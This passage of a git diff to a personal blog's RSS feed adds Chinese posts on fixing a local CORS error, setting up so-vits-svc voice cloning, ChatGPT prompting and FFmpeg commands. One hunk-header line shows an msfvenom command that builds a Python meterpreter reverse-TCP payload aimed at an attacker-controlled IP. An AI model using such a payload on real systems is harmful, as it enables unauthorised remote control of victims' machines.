@@ -6,9 +6,304 @@
     <description>欢迎来到我的个人站~</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 13 Jan 2023 21:46:28 +0800</pubDate>
-    <lastBuildDate>Fri, 13 Jan 2023 21:46:28 +0800</lastBuildDate>
+    <pubDate>Thu, 06 Jul 2023 22:24:56 +0800</pubDate>
+    <lastBuildDate>Thu, 06 Jul 2023 22:24:56 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+    <item>
+      <title>跨域问题</title>
+      <description>&lt;h3 id=&quot;吾尝终日而思矣不如须臾之所学&quot;&gt;吾尝终日而思矣，不如须臾之所学。&lt;/h3&gt;
+
+&lt;h2 id=&quot;问题的由来&quot;&gt;问题的由来&lt;/h2&gt;
+&lt;p&gt;发现了一个好玩的网页，解压放松型的， &lt;a href=&quot;https://aidn.jp/mikutap/&quot;&gt;https://aidn.jp/mikutap/&lt;/a&gt;,并找到了源码 &lt;a href=&quot;https://github.com/HFIProgramming/mikutap&quot;&gt;https://github.com/HFIProgramming/mikutap&lt;/a&gt;,很自然的，我要下载来运行看看，可以的话集成到自己的网页上。下载，然后浏览器打开，就报错了&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;index.html:1 Access to XMLHttpRequest at 'file:///Volumes/F/downloadchrome/mikutap-master/data/track/track.json' from origin 'null' 
+has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, isolated-app, 
+chrome-extension, chrome, https, chrome-untrusted.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/kuayuwenti/1.png&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;原因及解析&quot;&gt;原因及解析&lt;/h2&gt;
+
+&lt;p&gt;在浏览器打开本地的html文件， 上面请求的模型资源文件是一个本地文件， 协议是file://，如果是在服务器启动的话，则使用的是http或者https协议。
+出于安全性考虑， Chrome默认禁止了这种用法，file协议和http/https协议不同，会被Chrome认为是跨域访问，所以会报被CORS(Cross-Origin Resource Sharing，跨域资源共享)的安全策略阻止。&lt;/p&gt;
+
+&lt;h2 id=&quot;解决办法&quot;&gt;解决办法&lt;/h2&gt;
+
+&lt;p&gt;先说一下这个问题只会发生在本地，如果是部署到服务器上面是没有问题的。网上的解决方案大多都是禁用Chrome的安全策略，我觉得不妥。有个简单的方法解决这个问题，下载vscode的一个插件，使用插件打开即可。插件叫 Live Server，搜索安装即可。&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/posts/kuayuwenti/2.png&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;安装以后右击要打开的文件，选择 Open with Live Server 就可以了。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/kuayuwenti/3.png&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/kuayuwenti/4.png&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;用Live Server 打开之后浏览器上的地址是 http://127.0.0.1:5500/index.html&lt;/p&gt;
+
+&lt;p&gt;而直接用浏览器打开的地址是本地的文件地址  file:///Volumes/F/downloadchrome/mikutap-master/index.html&lt;/p&gt;
+
+&lt;p&gt;如此，一目了然。&lt;/p&gt;
+
+&lt;p&gt;小游戏真的很有意思 &lt;a href=&quot;https://aidn.jp/mikutap/&quot;&gt;https://aidn.jp/mikutap/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/07/跨域问题/&quot;&gt; 跨域问题 &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Thu, 06 Jul 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/07/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/07/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/</guid>
+        
+      <category>技术</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>AI语音</title>
+      <description>&lt;h3 id=&quot;原来你需要的不是答案而是时间&quot;&gt;原来你需要的不是答案，而是时间。&lt;/h3&gt;
+
+&lt;p&gt;so-vits-svc是基于VITS的开源项目，VITS（Variational Inference with adversarial learning for end-to-end Text-to-Speech）是一种结合变分推理（variational inference）、标准化流（normalizing flows）和对抗训练的高表现力语音合成模型。&lt;/p&gt;
+
+&lt;p&gt;基于Python3.10的开源库&lt;a href=&quot;https://github.com/svc-develop-team/so-vits-svc/tree/4.0-Vec768-Layer12&quot;&gt;so-vits-svc&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;踩坑记&quot;&gt;踩坑记&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;模型训练需要英伟达显卡，大部分mac没有，我的mac配置很高，依然没有。（如果已经获得模型文件，去运行推理是没有问题的）&lt;/li&gt;
+  &lt;li&gt;电脑配置低，或者像我一样没有英伟达显卡的可以使用（不推荐）google的colab。有一定技术门槛，需要懂程序代码；需要翻墙；虽然免费但是每天有使用时长限制，我在模型训练运行中就直接给我断了。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;人声伴奏分离不要使用 Spleeter，需要下载几个G的文件和模型，我使用后觉得效果很差。&lt;a href=&quot;https://vocalremover.org/&quot;&gt;https://vocalremover.org/&lt;/a&gt; 这个网站效果很好了，不用注册，简单易使用，几分钟搞定，如果想要专业点，使用UVR5 （Ultimate Vocal Remover），它目前是最优秀的人声伴奏分离工具之一，而且开源免费，开源地址：&lt;a href=&quot;https://github.com/Anjok07/ultimatevocalremovergui&quot;&gt;https://github.com/Anjok07/ultimatevocalremovergui&lt;/a&gt; ,windows和mac版本都有，也需要英伟达显卡，不过没有也可以用，就是差点意思。可以根据不同类型、乐器、背景音乐等去选择不同的算法，分离后的效果是不一样的，对于一般的歌曲来说差别似乎不是很大。需要时间去学习了解这个软件，追求高品质的同学要用它。这里有不错的介绍&lt;a href=&quot;https://www.bilibili.com/read/cv21997904&quot;&gt;最强 AI 人声伴奏分离工具 UVR5，更新5.5版本&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;底模文件直接去官网下载，放到代码指定目录中。&lt;/li&gt;
+  &lt;li&gt;这个开源库（so-vits-svc）一直在更新，分支也有好几个了，请先仔细查看readme文档说明。&lt;/li&gt;
+  &lt;li&gt;训练模型需要使用的音频文件质量很关键，直接影响模型质量，推理质量。宁缺毋滥。这是一项庞大的工作，要有耐心。&lt;/li&gt;
+  &lt;li&gt;推理的最终效果不好不一定是模型的问题，有可能是你想要让模型人物唱的歌并不适合模型人物，比如模型训练了一个低音男歌手，你要让他去唱韩红的青藏高原，他必然唱不上去的，沙哑或跑调或直接刺啦声了。&lt;/li&gt;
+  &lt;li&gt;无论训练的是歌手还是动漫人物，都涉及到侵权问题，请慎重传播。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;
+
+&lt;p&gt;首先确保本机已经安装好Python3.+的开发环境，这里我使用的是python3.9.0，随后使用Git命令克隆项目：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/svc-develop-team/so-vits-svc.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;随后进入项目的目录：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd so-vits-svc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;接着安装依赖，如果是Linux或者Mac系统，运行命令：&lt;/p&gt;
+
+&lt;p&gt;pip3 install -r requirements.txt&lt;/p&gt;
+
+&lt;p&gt;依赖库安装成功之后，在项目的根目录运行命令，启动服务：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python webUI.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;安装 wget&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install wget
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget --version
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;预先下载的模型文件,1.3G,需要一点时间。  &lt;br /&gt;
+根目录下&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -P pretrain/ http://obs.cstcloud.cn/share/obs/sankagenkeshi/checkpoint_best_legacy_500.pt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/05/AI语音/&quot;&gt; AI语音 &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Tue, 16 May 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3/</guid>
+        
+      <category>技术</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>ChatGPT</title>
+      <description>&lt;h3 id=&quot;吾心光明-亦复何言&quot;&gt;吾心光明 亦复何言?&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;量变产生质变，chatGPT的质变是什么呢？&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;chatGPT 网页版网址 &lt;a href=&quot;https://chat.openai.com/&quot;&gt;https://chat.openai.com/&lt;/a&gt;&lt;br /&gt;
+一些输入文本（prompt）&lt;a href=&quot;https://github.com/f/awesome-chatgpt-prompts&quot;&gt;https://github.com/f/awesome-chatgpt-prompts&lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;使用技巧&quot;&gt;使用技巧&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;万能 prompt&lt;/strong&gt;&lt;br /&gt;
+我想请你XXX（做某一件事），请问我应该如何向你提问才能得到最满意的答案，请提供全面、详细的建议，针对每一个建议请你提供具体的提问范例，注意这些范例都是关于如何向你提问获取做这件事的建议的，最后根据你所有的建议，再综合提供一个总的提问范例，注意这个范例必须同时体现你所有的建议。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;搜索图片 prompt（本质是返回图片网站的搜索结果，示例使用的是 Unsplash API，并且受限于ChatGPT的约束，比如 不能提供或生成具有性别、种族、外貌等方面的特定照片。 ）&lt;/strong&gt;&lt;br /&gt;
+从现在起, 当你想发送一张图片时，请使用 Markdown，并且不要有反斜线，不要用代码块。
+使用 Unsplash API (https://source.unsplash.com/1280x720/? &amp;lt; PUT YOUR QUERY HERE &amp;gt;)。&lt;/p&gt;
+
+&lt;h2 id=&quot;使用示例&quot;&gt;使用示例&lt;/h2&gt;
+
+&lt;p&gt;1,&lt;br /&gt;
+&lt;img src=&quot;/images/posts/chatGPT/1.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;2,
+&lt;img src=&quot;/images/posts/chatGPT/2.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt; &lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;3,
+&lt;img src=&quot;/images/posts/chatGPT/3.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt; &lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;4,
+&lt;img src=&quot;/images/posts/chatGPT/4.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt; &lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;5,
+&lt;img src=&quot;/images/posts/chatGPT/5.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt; &lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;6,
+&lt;img src=&quot;/images/posts/chatGPT/6.png&quot; alt=&quot;&quot; width=&quot;65%&quot; /&gt; &lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;工作原理&quot;&gt;工作原理&lt;/h2&gt;
+
+&lt;p&gt;ChatGPT的最大特点是它是一个可以用自然语言（人类的语言）来发出指令的人工智能。
+虽然以前也有可以直接对话的AI，如智能音箱等，但它们无法进行灵活的对话。
+与这些设备相比，当前的语言生成AI性能得到了飞跃式的提升，已经达到了实用水平。&lt;/p&gt;
+
+&lt;p&gt;然而，这并不意味着你可以随意提问。 在提问时，需要一些巧妙的技巧。
+网上有不少文章指出，尝试使用ChatGPT后得到的回答质量较低，但很可能大部分原因是没有充分发挥ChatGPT的潜在能力。
+事实上，它的能力比大多数人预期的要高得多。&lt;/p&gt;
+
+&lt;p&gt;首先，考虑一下要问什么问题。
+根据提问的内容，它有时会夹杂一些虚假信息。&lt;/p&gt;
+
+&lt;p&gt;为什么呢？驱动ChatGPT的引擎是大型语言模型（LLM）。
+LLM虽然是一个“听人类的话并用人类的话回应”的机器，但并没有智慧或思考能力。
+它收集了大约5万亿个单词的大量数据，然后从这些数据中进行学习，并给出学习结果。
+基本上，它是根据前面的句子预测概率最高的“接下来”的内容并输出，这是一个非常简单的机制。
+例如，当听到“很久以前”的话，它会接着说“在一个地方”，这样应该更容易理解。
+实际上，在学习过程之后，人类还需要手动进行各种调试，但其根本仍然是一个基于概率进行回答的机器。&lt;/p&gt;
+
+&lt;p&gt;也就是说，它并不是在记忆互联网上的信息并输出。
+当询问关于小众知识的问题时，ChatGPT有时会给出错误的信息。&lt;/p&gt;
+
+&lt;p&gt;根据上述讨论，提高回答准确性的方法如下。
+由于LLM的学习数据问题，即使询问同样的问题，使用英语得到的答案会更准确。
+这是因为在学习数据中英语占据了绝大多数。
+此外，如果事先准备了较为精准的数据，让AI进行处理，可以期待更高的准确性。
+例如，收集有关某个人物的事实信息，将其以条目形式输入ChatGPT。 然后，请求：“请根据这些内容撰写一个关于该人物的介绍。”
+这样，ChatGPT几乎不会出现事实错误，而会为我们撰写出最合适的介绍文章。
+输入长篇文章并让其进行总结也是一个好方法。&lt;/p&gt;
+
+&lt;p&gt;要提高ChatGPT的精确度，关键在于巧妙地设计输入文本（prompt）。
+尽量具体地提问，并附上一些条件。 举个例子，假设你希望ChatGPT为你想出一个有趣的产品方案。
+此时，如果你仅仅命令它“请想一个有趣的产品方案”，那么它很可能给出一个模糊的答案。
+但是，如果你这样命令：“你是一家广告代理公司的营销部门主管。请为即将发布的新饮料提出最佳方案。限制条件是…”，那么生成的答案就更可能包含广告代理公司的营销部门主管可能会考虑的饮料方案，而且会是一个高质量的方案，其中还可能包含更多专业术语和知识。简而言之，需要为AI设定角色，并给出具体指令。&lt;/p&gt;
+
+&lt;p&gt;接下来，可以设定一些限制条件，例如：“字数约为300字”，“中学生也能理解”，“简洁的文章”等。然后输入与AI生成答案相关的文本。
+可以使用“#”等符号将命令和限制条件与输入文本分开。 为什么这样可以提高精度呢？
+简单来说，不使用prompt的情况下利用ChatGPT类似于在充满各种信息的互联网上盲目搜索特定内容。 因此，通过prompt逐步缩小搜索范围，这种格式就变得非常有效。
+所以，不要在一次交流中结束，而是多次对话，以提高准确性。&lt;/p&gt;
+
+&lt;p&gt;另一个值得一提的方法是分阶段生成输出。
+正如前面所提到的，语言生成AI是基于概率生成最可能的答案。
+因此，逐步展开逻辑更容易提高输出质量。
+让AI分阶段思考，逐渐靠近所需答案。
+例如，如果最终目标是撰写一篇关于ChatGPT的文章，那么不要用一个提示就让AI立即写文章，而是让AI分步进行： 1. 提出企画； 2. 制作结构； 3. 针对2的结果进行审查； 4. 根据3的结果实际编写文章。
+通过这样的过程，最终生成的文章将更加精确。&lt;/p&gt;
+
+&lt;p&gt;简单来说，与ChatGPT的沟通越接近人类之间高效的沟通方式，ChatGPT的准确性就越高。
+这些方法其实是大家应该已经熟知的。
+在与AI的交流中，将其视为虚拟的下属或助手是非常重要的。
+通过明确角色、给出具体指令、设定限制条件以及多次对话和分阶段生成输出，我们可以充分利用ChatGPT的能力，从而提高它在回答问题和生成内容时的准确性。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/03/ChatGPT/&quot;&gt; ChatGPT &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Thu, 23 Mar 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/03/ChatGPT/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/03/ChatGPT/</guid>
+        
+      <category>技术</category>
+        
+        
+    </item>
     
     <item>
       <title>斗地主出牌系列概率计算_地主方</title>
@@ -596,6 +891,145 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
     </item>
     
     <item>
+      <title>FFmpeg</title>
+      <description>&lt;h3 id=&quot;我的嘴角上扬和月亮肩并肩&quot;&gt;我的嘴角上扬，和月亮肩并肩。&lt;/h3&gt;
+
+&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
+
+&lt;p&gt;FFmpeg是一个开源的跨平台多媒体框架，它可以用于处理音频、视频和多媒体流。它提供了一组强大的工具和库，可以用于音视频的录制、转码、编辑、流媒体和播放等操作。&lt;/p&gt;
+
+&lt;p&gt;以下是FFmpeg的一些主要特点和功能：&lt;/p&gt;
+
+&lt;p&gt;格式支持：FFmpeg支持广泛的音视频格式，包括常见的MP4、AVI、MKV、MP3、AAC等，以及更多的专有格式和编解码器。它可以读取和写入不同格式之间的转换。&lt;/p&gt;
+
+&lt;p&gt;编解码器：FFmpeg包含众多音视频编解码器，可以对音频和视频进行解码和编码。这使得它可以处理不同编码格式的媒体文件，并实现高效的压缩和解压缩。&lt;/p&gt;
+
+&lt;p&gt;滤镜和特效：FFmpeg提供了丰富的滤镜和特效，可以对音频和视频进行处理和改善。例如，你可以应用图像调整、色彩校正、降噪、模糊、剪裁等效果，以及音频均衡器、混响、消除噪声等处理。&lt;/p&gt;
+
+&lt;p&gt;转码和转换：FFmpeg可以将一个媒体文件转换为另一种格式或编码方式，实现音视频的转码和转换。你可以调整分辨率、帧率、比特率等参数，以满足不同的需求。&lt;/p&gt;
+
+&lt;p&gt;流媒体：FFmpeg支持音视频的实时流媒体传输，可以将音视频内容通过网络进行直播或点播。它可以与流媒体服务器配合使用，如RTMP、HLS、UDP等，实现音视频的传输和分发。&lt;/p&gt;
+
+&lt;p&gt;命令行工具：FFmpeg提供了命令行工具，可以通过命令行界面执行各种音视频处理任务。这使得它非常适合自动化和批处理操作。&lt;/p&gt;
+
+&lt;p&gt;除了上述功能之外，FFmpeg还具有很好的跨平台性，可在多个操作系统上运行，包括Windows、Mac OS、Linux等。它还有一个活跃的开发社区，不断更新和改进功能。&lt;/p&gt;
+
+&lt;h2 id=&quot;安装查看&quot;&gt;安装查看&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//安装
+brew install ffmpeg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//版本信息
+ffmpeg -version  
+
+结果：
+ffmpeg version 6.0 Copyright (c) 2000-2023 the FFmpeg developers
+built with Apple clang version 14.0.0 (clang-1400.0.29.202)
+configuration: --prefix=/usr/local/Cellar/ffmpeg/6.0 --enable-shared --enable-pthreads --enable-version3 --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-gnutls --enable-gpl --enable-libaom --enable-libaribb24 --enable-libbluray --enable-libdav1d --enable-libmp3lame --enable-libopus --enable-librav1e --enable-librist --enable-librubberband --enable-libsnappy --enable-libsrt --enable-libsvtav1 --enable-libtesseract --enable-libtheora --enable-libvidstab --enable-libvmaf --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libxvid --enable-lzma --enable-libfontconfig --enable-libfreetype --enable-frei0r --enable-libass --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopenjpeg --enable-libspeex --enable-libsoxr --enable-libzmq --enable-libzimg --disable-libjack --disable-indev=jack --enable-videotoolbox
+libavutil      58.  2.100 / 58.  2.100
+libavcodec     60.  3.100 / 60.  3.100
+libavformat    60.  3.100 / 60.  3.100
+libavdevice    60.  1.100 / 60.  1.100
+libavfilter     9.  3.100 /  9.  3.100
+libswscale      7.  1.100 /  7.  1.100
+libswresample   4. 10.100 /  4. 10.100
+libpostproc    57.  1.100 / 57.  1.100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;使用&quot;&gt;使用&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;查看文件信息&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;示例:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg -i /Users/liuqiang/Desktop/我的歌声里.mp3  
+
+结果：  
+ffmpeg version 6.0 Copyright (c) 2000-2023 the FFmpeg developers
+  built with Apple clang version 14.0.0 (clang-1400.0.29.202)
+  configuration: --prefix=/usr/local/Cellar/ffmpeg/6.0 --enable-shared --enable-pthreads --enable-version3 --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-gnutls --enable-gpl --enable-libaom --enable-libaribb24 --enable-libbluray --enable-libdav1d --enable-libmp3lame --enable-libopus --enable-librav1e --enable-librist --enable-librubberband --enable-libsnappy --enable-libsrt --enable-libsvtav1 --enable-libtesseract --enable-libtheora --enable-libvidstab --enable-libvmaf --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libxvid --enable-lzma --enable-libfontconfig --enable-libfreetype --enable-frei0r --enable-libass --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopenjpeg --enable-libspeex --enable-libsoxr --enable-libzmq --enable-libzimg --disable-libjack --disable-indev=jack --enable-videotoolbox
+  libavutil      58.  2.100 / 58.  2.100
+  libavcodec     60.  3.100 / 60.  3.100
+  libavformat    60.  3.100 / 60.  3.100
+  libavdevice    60.  1.100 / 60.  1.100
+  libavfilter     9.  3.100 /  9.  3.100
+  libswscale      7.  1.100 /  7.  1.100
+  libswresample   4. 10.100 /  4. 10.100
+  libpostproc    57.  1.100 / 57.  1.100
+Input #0, mp3, from '/Users/liuqiang/Desktop/我的歌声里.mp3':
+  Metadata:
+    major_brand     : mp42
+    minor_version   : 0
+    compatible_brands: M4A mp42isom
+    title           : 我的歌声里
+    album           : Everything In The World
+    artist          : 曲婉婷
+    iTunSMPB        :  00000000 00000A40 0000006C 000000000091C554 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    encoder         : Lavf60.3.100
+  Duration: 00:03:36.66, start: 0.025057, bitrate: 128 kb/s
+  Chapters:
+    Chapter #0:0: start 0.000000, end 216.689000
+      Metadata:
+        title           : 我的歌声里
+  Stream #0:0: Audio: mp3, 44100 Hz, stereo, fltp, 128 kb/s
+    Metadata:
+      encoder         : Lavc60.3.
+At least one output file must be specified
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;文件编码格式转换&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//将M4A格式的音频文件转换为MP3格式
+ffmpeg -i input.m4a -acodec mp3 -vn output.mp3  
+
+//其中，input.m4a是要转换的M4A文件的路径和文件名，output.mp3是转换后的MP3文件的路径和文件名。您可以根据需要自定义文件名和路径。  
+//示例:   
+ffmpeg -i /Users/liuqiang/Desktop/我的歌声里.m4a  -acodec mp3 -vn /Users/liuqiang/Desktop/我的歌声里.mp3 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//转成 H.264 编码
+ffmpeg -i out.mp4 -c:v libx264 output.mp4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//转成 H.265 编码
+ffmpeg -i out.mp4 -c:v libx265 output.mp4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;音视频提取&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//提取音频
+ffmpeg -i origin.mp4 -acodec copy -vn voice.aac
+
+解释：ffmpeg -i 原始视频文件 -acodec copy -vn 输出音频文件
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 提取视频
+ffmpeg -i origin.mp4 -vcodec copy -an video0.mp4
+
+解释：ffmpeg -i 原始视频文件 -acodec copy -vn 输出视频文件
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
